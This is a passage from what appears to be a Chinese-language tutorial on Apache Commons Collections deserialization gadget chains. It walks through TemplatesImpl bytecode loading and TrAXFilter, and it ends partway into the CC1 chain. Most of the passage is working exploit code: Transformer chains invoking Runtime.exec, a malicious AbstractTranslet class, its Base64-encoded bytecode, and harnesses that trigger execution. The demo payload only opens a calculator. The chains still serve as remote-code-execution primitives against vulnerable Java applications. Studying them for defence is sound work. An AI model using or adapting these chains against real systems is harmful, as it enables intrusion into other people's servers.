class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>     <span class="hljs-comment">//Transformer数组</span><br>     Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>             <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>             <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>             <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>             <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>     &#125;;<br><br>     <span class="hljs-comment">//ChainedTransformer实例</span><br>     <span class="hljs-type">Transformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>     <span class="hljs-type">Map</span> <span class="hljs-variable">uselessMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>     <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(uselessMap, chainedTransformer);<br>     lazyMap.get(<span class="hljs-string">&quot;test&quot;</span>);<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><h4 id="TemplatesImpl（重要）"><a href="#TemplatesImpl（重要）" class="headerlink" title="TemplatesImpl（重要）"></a>TemplatesImpl（重要）</h4><p>这个类不在 Apache Commons Collections 中。但是 TemplatesImpl 这个类很特殊，我们可以借助其动态加载包含恶意的字节码，部分简化代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TemplatesImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Templates</span>, Serializable &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">_name</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[][] _bytecodes = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-type">TransformerFactoryImpl</span> <span class="hljs-variable">_tfactory</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-comment">//关键方法：newTransformer()</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> Transformer <span class="hljs-title function_">newTransformer</span><span class="hljs-params">()</span><br>                <span class="hljs-keyword">throws</span> TransformerConfigurationException<br>            &#123;<br>                TransformerImpl transformer;<br>                <span class="hljs-comment">// 关键点，调用 getTransletInstance()</span><br>                transformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,<br>                    _indentNumber, _tfactory);<br>            &#125;<br><br><br>    <span class="hljs-comment">//继续跟进 getTransletInstance() 方法：</span><br>    <span class="hljs-keyword">private</span> Translet <span class="hljs-title function_">getTransletInstance</span><span class="hljs-params">()</span><br>        <span class="hljs-keyword">throws</span> TransformerConfigurationException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (_name == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br><br>            <span class="hljs-comment">//先判断是否为 null，如果为 null 的话去加载字节码，紧接着 newInstance() 对其实例化。</span><br>            <span class="hljs-keyword">if</span> (_class == <span class="hljs-literal">null</span>) defineTransletClasses();<br><br>            <span class="hljs-type">AbstractTranslet</span> <span class="hljs-variable">translet</span> <span class="hljs-operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();<br>            …………<br>            &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//继续跟进 defineTransletClasses() 方法:</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">defineTransletClasses</span><span class="hljs-params">()</span><br>        <span class="hljs-keyword">throws</span> TransformerConfigurationException &#123;<br>        …………<br>        <span class="hljs-type">TransletClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> (TransletClassLoader)<br>            AccessController.doPrivileged(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span>() &#123;<br>                <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader());<br>                &#125;<br>            &#125;);<br>        …………<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; classCount; i++) &#123;<br>                _class[i] = loader.defineClass(_bytecodes[i]);  <span class="hljs-comment">//关键点</span><br>                <span class="hljs-keyword">final</span> <span class="hljs-type">Class</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> _class[i].getSuperclass();<br>            &#125;<br>        &#125;<br><br>    <span class="hljs-comment">//继续跟进 TransletClassLoader，这个类里重写了 defineClass 方法</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransletClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span> &#123;<br>        TransletClassLoader(ClassLoader parent) &#123;<br>            <span class="hljs-built_in">super</span>(parent);<br>        &#125;<br><br>        Class <span class="hljs-title function_">defineClass</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] b)</span> &#123;<br>            <span class="hljs-keyword">return</span> defineClass(<span class="hljs-literal">null</span>, b, <span class="hljs-number">0</span>, b.length);   <span class="hljs-comment">//关键点</span><br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>恶意字节码的生成：<br>HelloTemplatesImpl.java，主要其必须继承 AbstractTranslet 类，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// HelloTemplatesImpl.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloTemplatesImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HelloTemplatesImpl</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-keyword">try</span>&#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们将其编译为 HelloTemplatesImpl.class，然后进行 Base64 编码，得到如下结果：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj<br></code></pre></td></tr></table></figure><p>测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 测试 TemplatesImpl</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br><br>    <span class="hljs-comment">//反射设置 Field</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object object, String fieldName, Object value)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            field.set(object, value);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> TransformerConfigurationException &#123;<br>        <span class="hljs-comment">//恶意字节码</span><br>        <span class="hljs-type">byte</span>[] code = Base64.decode(<span class="hljs-string">&quot;yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj&quot;</span>);<br><br>        <span class="hljs-comment">//反射设置 Field</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        templates.newTransformer();<br>    &#125;<br>&#125;<br><span class="hljs-comment">//弹计算器</span><br></code></pre></td></tr></table></figure><p>所以我们只需传入恶意字节码给 TemplatesImpl，然后调用其 newTransformer 方法。那么有没有类可以调用 TemplatesImpl.newTransformer()，这里先介绍一个构造 CC3 中将会用到的类 TrAXFilter，下面是其构造函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TrAXFilter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">XMLFilterImpl</span> &#123;<br><br>    <span class="hljs-comment">//构造函数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TrAXFilter</span><span class="hljs-params">(Templates templates)</span>  <span class="hljs-keyword">throws</span><br>        TransformerConfigurationException<br>    &#123;<br>        _templates = templates;<br>        _transformer = (TransformerImpl) templates.newTransformer();    <span class="hljs-comment">//关键点</span><br>        …………<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 测试 TrAXFilter</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br><br>    <span class="hljs-comment">//反射设置 Field</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object object, String fieldName, Object value)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            field.set(object, value);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> TransformerConfigurationException &#123;<br>        <span class="hljs-comment">//字节码</span><br>        <span class="hljs-type">byte</span>[] code = Base64.decode(<span class="hljs-string">&quot;yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj&quot;</span>);<br><br>        <span class="hljs-comment">//反射设置 Field</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>        instantiateTransformer.transform(TrAXFilter.class);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="CC1-7"><a href="#CC1-7" class="headerlink" title="CC1-7"></a>CC1-7</h2><h3 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h3><p>通过 AnnotationInvocationHandler 类触发 LazyMap 的 get 方法。<br>简化版 AnnotationInvocationHandler 类的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AnnotationInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span>, Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span 